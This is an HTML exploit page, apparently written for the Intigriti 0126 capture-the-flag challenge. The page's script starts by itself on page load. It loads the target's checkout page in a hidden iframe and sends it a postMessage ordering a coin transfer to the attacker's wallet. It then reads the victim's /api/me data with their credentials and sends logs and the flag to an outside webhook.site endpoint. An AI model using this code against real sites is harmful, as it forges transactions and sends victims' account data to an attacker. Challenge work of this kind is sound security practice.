<!DOCTYPE html>
<html>
<head>
    <title>Debug Exploit</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
        h1 { color: #0f0; }
        #log { background: #111; padding: 15px; border: 1px solid #333; margin: 20px 0; font-size: 11px; max-height: 500px; overflow-y: auto; }
        .success { color: #0f0; }
        .error { color: #f00; }
        .info { color: #0ff; }
        .warning { color: #ff0; }
        iframe { display: none; }
        button { background: #0f0; color: #000; border: none; padding: 15px 30px; font-size: 16px; cursor: pointer; margin: 10px; }
        button:hover { background: #0ff; }
    </style>
</head>
<body>
    <h1>ðŸŽ¯ Intigriti Challenge 0126 - Debug Exploit</h1>
    <button onclick="exploit()">ðŸš€ Run Exploit</button>
    <button onclick="testPostMessage()">ðŸ“¡ Test postMessage Only</button>
    <div id="log"></div>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';
        const WEBHOOK = 'https://webhook.site/84f4a2e4-3034-473b-8326-303b146f1067';

        let step = 0;
        let iframe = null;

        function log(msg, type = 'info', data = {}) {
            step++;
            const timestamp = new Date().toLocaleTimeString();
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += `<div class="${type}">[${step}] ${timestamp} - ${msg} ${JSON.stringify(data)}</div>`;
            console.log(`[${step}] ${msg}`, data);

            // Send to webhook
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                mode: 'no-cors',
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    step: step,
                    message: msg,
                    type: type,
                    data: data
                })
            }).catch(e => console.log('Webhook error:', e));
        }

        async function testPostMessage() {
            log('ðŸ§ª Testing postMessage approach...', 'warning');

            if (!iframe) {
                log('Creating iframe first...', 'info');
                iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                document.body.appendChild(iframe);

                await new Promise(resolve => {
                    iframe.onload = resolve;
                    setTimeout(resolve, 5000);
                });
            }

            log('Sending postMessage...', 'info');
            log('Target wallet:', 'info', { wallet: OUR_WALLET });
            log('Iframe src:', 'info', { src: iframe.src });
            log('Iframe contentWindow accessible:', 'info', { accessible: !!iframe.contentWindow });

            try {
                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');

                log('âœ… postMessage sent successfully!', 'success');

                setTimeout(async () => {
                    await checkFlag();
                }, 3000);

            } catch (e) {
                log('âŒ postMessage error:', 'error', { error: e.message });
            }
        }

        async function exploit() {
            log('ðŸš€ EXPLOIT STARTED', 'info');
            log('Challenge target:', 'info', { url: TARGET });
            log('Our wallet:', 'info', { wallet: OUR_WALLET });
            log('Webhook:', 'info', { url: WEBHOOK });

            try {
                // STEP 1: Check if we're in admin context
                log('Checking authentication context...', 'info');

                // Try to fetch /api/me to see if we have access
                const meCheck = await fetch(TARGET + '/api/me', { credentials: 'include' })
                    .then(r => r.json())
                    .catch(e => ({ error: e.message }));

                log('/api/me response:', 'info', {
                    hasData: !!meCheck.username,
                    username: meCheck.username || 'none',
                    hasFlag: !!meCheck.flag
                });

                // STEP 2: Create iframe
                log('Creating iframe to checkout.html...', 'info');
                iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.id = 'checkoutIframe';
                iframe.name = 'checkoutIframe';
                iframe.src = TARGET + '/checkout.html?currency=1337COIN&price=1';
                document.body.appendChild(iframe);

                log('âœ… Iframe element created', 'success');

                // STEP 3: Wait for iframe to load
                log('Waiting for iframe to load (will wait up to 10s)...', 'warning');

                await new Promise(resolve => {
                    let loaded = false;

                    iframe.onload = () => {
                        loaded = true;
                        log('âœ… iframe.onload fired!', 'success');
                        resolve();
                    };

                    // Also resolve after timeout
                    setTimeout(() => {
                        if (!loaded) {
                            log('âš  iframe.onload timeout - using fallback', 'warning');
                        }
                        resolve();
                    }, 10000);
                });

                // STEP 4: Check iframe accessibility
                log('Checking iframe accessibility...', 'info');
                log('Iframe src:', 'info', { src: iframe.src });
                log('Iframe contentWindow:', 'info', { exists: !!iframe.contentWindow });

                if (!iframe.contentWindow) {
                    log('âŒ Cannot access iframe.contentWindow!', 'error');
                    return;
                }

                // STEP 5: Additional wait for async operations in iframe
                log('Waiting 3s for iframe async operations (loadWallets, etc)...', 'info');
                await new Promise(r => setTimeout(r, 3000));

                // STEP 6: Send postMessage
                log('ðŸ“¡ SENDING postMessage...', 'warning');
                log('Message data:', 'info', {
                    type: 'submitTransaction',
                    toAddress: OUR_WALLET,
                    currency: '1337COIN',
                    amount: 1
                });

                const messageData = {
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: OUR_WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                };

                try {
                    iframe.contentWindow.postMessage(messageData, '*');
                    log('âœ… postMessage sent to checkout.html', 'success');
                } catch (e) {
                    log('âŒ postMessage failed:', 'error', { error: e.message, stack: e.stack });
                    return;
                }

                // STEP 7: Trigger XSS alert (non-blocking)
                log('Triggering XSS alert...', 'info');
                setTimeout(() => alert('gigawatz'), 100);
                log('âœ… XSS alert triggered', 'success');

                // STEP 8: Wait for transaction
                log('Waiting 5s for transaction processing...', 'info');
                await new Promise(r => setTimeout(r, 5000));

                // STEP 9: Check for flag
                log('Checking for flag...', 'info');
                await checkFlag();
                await new Promise(r => setTimeout(r, 3000));
                await checkFlag();
                await new Promise(r => setTimeout(r, 3000));
                await checkFlag();

                log('ðŸŽ¯ Exploit execution complete!', 'success');
                log('Check webhook for full details', 'info');

            } catch (error) {
                log('âŒ EXPLOIT ERROR:', 'error', { error: error.message, stack: error.stack });
                console.error(error);
            }
        }

        async function checkFlag() {
            log('Fetching /api/me...', 'info');

            try {
                const response = await fetch(TARGET + '/api/me', {
                    credentials: 'include',
                    headers: { 'Accept': 'application/json' }
                });

                const data = await response.json();

                log('/api/me response:', 'info', {
                    status: response.status,
                    hasFlag: !!data.flag,
                    flag: data.flag || 'none',
                    walletCount: data.wallets?.length || 0
                });

                if (data.wallets) {
                    data.wallets.forEach(w => {
                        log('  Wallet:', 'info', {
                            currency: w.currency,
                            address: w.address?.substring(0, 16) + '...',
                            balance: w.balance
                        });
                    });
                }

                if (data.flag) {
                    log('ðŸ†ðŸ†ðŸ† FLAG FOUND! ðŸ†ðŸ†ðŸ†', 'success');
                    log('FLAG: ' + data.flag, 'success');

                    // Send flag to webhook
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        mode: 'no-cors',
                        body: JSON.stringify({
                            timestamp: new Date().toISOString(),
                            flag: data.flag,
                            challenge: 'intigriti-0126',
                            wallet: OUR_WALLET
                        })
                    }).catch(() => {});

                    alert('ðŸ† FLAG: ' + data.flag);
                    return true;
                }

                log('No flag yet', 'warning');
                return false;

            } catch (error) {
                log('Flag check error:', 'error', { error: error.message });
                return false;
            }
        }

        // Auto-start for admin bot (comment out for manual testing)
        window.addEventListener('load', () => {
            log('Page loaded - auto-starting in 1s...', 'info');
            setTimeout(exploit, 1000);
        });
    </script>
</body>
</html>
